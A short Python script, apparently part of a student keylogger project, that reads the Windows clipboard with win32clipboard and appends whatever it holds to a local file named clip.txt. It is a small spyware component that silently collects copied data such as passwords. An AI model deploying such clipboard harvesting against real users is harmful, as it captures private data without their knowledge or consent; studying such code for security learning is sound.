import win32clipboard

clipboard_information="clip.txt"
file_path= "D:\\CYBERSECURITY PROJECT(KEYLOGGER)\\project"

extend="\\" 

def copy_clipboard():
    with open(file_path + extend +clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data= win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + data)
        except:
            f.write("clipboard could be not copied")

copy_clipboard()